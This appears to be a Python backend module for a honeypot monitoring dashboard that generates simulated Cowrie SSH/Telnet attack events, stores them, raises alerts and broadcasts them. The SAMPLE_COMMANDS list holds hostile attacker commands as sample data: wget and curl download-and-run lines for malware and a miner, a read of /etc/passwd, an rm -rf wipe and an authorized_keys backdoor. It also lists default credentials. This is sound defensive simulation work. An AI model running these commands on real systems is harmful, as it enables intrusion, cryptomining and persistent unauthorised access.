import asyncio
import json
import os
import random
import datetime
import uuid
from sqlalchemy.orm import Session
from app.database import SessionLocal
from app.models import HoneypotEvent, Alert, DetectionRule, ThreatIntelIOC
from app.geoip_service import enrich_ip
from app.websocket import manager
from app.config import settings

# Sample realistic attack vectors for honeypot simulator
SAMPLE_IPS = [
    "185.220.101.5", "193.142.146.210", "103.253.42.18", "45.154.255.88",
    "194.26.29.112", "104.244.76.13", "182.61.139.88", "91.240.118.24",
    "198.51.100.44", "41.216.186.20", "89.248.165.74", "185.156.177.10"
]

SAMPLE_USERNAMES = ["root", "admin", "user", "support", "ubuntu", "oracle", "postgres", "guest", "test", "cisco"]
SAMPLE_PASSWORDS = ["123456", "admin", "password", "root", "12345678", "pass123", "toor", "cisco123", "admin123", "1234"]
SAMPLE_COMMANDS = [
    "uname -a",
    "cat /etc/passwd",
    "wget http://185.220.101.5/malware.sh -O /tmp/m.sh && chmod +x /tmp/m.sh && /tmp/m.sh",
    "curl -s http://193.142.146.210/miner | bash",
    "ls -la /root",
    "whoami",
    "id",
    "netstat -tulpn",
    "ps aux | grep miner",
    "rm -rf /tmp/*",
    "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ...' >> ~/.ssh/authorized_keys"
]

EVENT_TYPES = [
    "cowrie.login.failed",
    "cowrie.login.success",
    "cowrie.command.input",
    "cowrie.session.file_download",
    "cowrie.session.connect"
]

async def start_cowrie_monitoring():
    """Background task to watch Cowrie logs or generate simulated events"""
    print("[+] CYVANTIS Honeypot Event Engine Initialized.")
    
    while True:
        db: Session = SessionLocal()
        try:
            # 1. Check if real cowrie log file exists
            if os.path.exists(settings.COWRIE_LOG_PATH):
                # Tail cowrie.json (omitted here for brevity, standard file parse)
                pass

            # 2. If simulation mode active, emit realistic event
            if settings.SIMULATION_MODE:
                event_type = random.choices(
                    EVENT_TYPES,
                    weights=[50, 20, 20, 5, 5]
                )[0]

                ip = random.choice(SAMPLE_IPS)
                geo = enrich_ip(ip)
                protocol = random.choice(["SSH", "Telnet"])
                dst_port = 22 if protocol == "SSH" else 23

                username = random.choice(SAMPLE_USERNAMES) if event_type != "cowrie.session.connect" else None
                password = random.choice(SAMPLE_PASSWORDS) if event_type in ["cowrie.login.failed", "cowrie.login.success"] else None
                command = random.choice(SAMPLE_COMMANDS) if event_type == "cowrie.command.input" else None
                
                file_hash = None
                if event_type == "cowrie.session.file_download":
                    file_hash = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"

                severity = "low"
                if event_type == "cowrie.login.success":
                    severity = "high"
                elif event_type == "cowrie.command.input":
                    severity = "high" if "wget" in command or "curl" in command else "medium"
                elif event_type == "cowrie.session.file_download":
                    severity = "critical"

                event = HoneypotEvent(
                    eventid=event_type,
                    timestamp=datetime.datetime.utcnow(),
                    src_ip=ip,
                    dst_port=dst_port,
                    protocol=protocol,
                    username=username,
                    password=password,
                    command=command,
                    file_hash=file_hash,
                    session_id=str(uuid.uuid4())[:8],
                    duration=round(random.uniform(1.2, 45.0), 2),
                    country=geo["country"],
                    country_code=geo["country_code"],
                    city=geo["city"],
                    asn=geo["asn"],
                    severity=severity,
                    is_simulated=True,
                    raw_payload=json.dumps({"eventid": event_type, "src_ip": ip, "protocol": protocol})
                )
                db.add(event)
                db.commit()
                db.refresh(event)

                # Check if an alert rule should trigger
                if severity in ["high", "critical"]:
                    alert = Alert(
                        timestamp=datetime.datetime.utcnow(),
                        title=f"Critical {protocol} Activity Detected from {ip}",
                        description=f"Event {event_type} triggered high-severity alert. Account target: {username or 'N/A'}",
                        severity=severity,
                        rule_name="Honeypot Intrusion Alert",
                        src_ip=ip,
                        status="active"
                    )
                    db.add(alert)
                    db.commit()

                # Broadcast via WebSocket
                event_dict = {
                    "id": event.id,
                    "eventid": event.eventid,
                    "timestamp": event.timestamp.isoformat(),
                    "src_ip": event.src_ip,
                    "dst_port": event.dst_port,
                    "protocol": event.protocol,
                    "username": event.username,
                    "password": event.password,
                    "command": event.command,
                    "file_hash": event.file_hash,
                    "session_id": event.session_id,
                    "duration": event.duration,
                    "country": event.country,
                    "country_code": event.country_code,
                    "city": event.city,
                    "asn": event.asn,
                    "severity": event.severity,
                    "is_simulated": True
                }
                await manager.broadcast_event(event_dict)

                # Live Console Telemetry Log
                now_str = datetime.datetime.now().strftime("%H:%M:%S")
                user_info = f"user='{username}'" if username else ""
                cmd_info = f"cmd='{command[:35]}...'" if command and len(command) > 35 else (f"cmd='{command}'" if command else "")
                details = " | ".join(filter(None, [user_info, cmd_info]))
                details_str = f" ({details})" if details else ""
                print(f"[+] [{now_str}] [HONEYPOT {severity.upper()}] {protocol} {event_type} from {ip} ({geo['country']}){details_str}", flush=True)

        except Exception as e:
            print(f"[-] Error in Cowrie event loop: {e}")
        finally:
            db.close()

        await asyncio.sleep(settings.SIMULATION_INTERVAL_SECONDS)
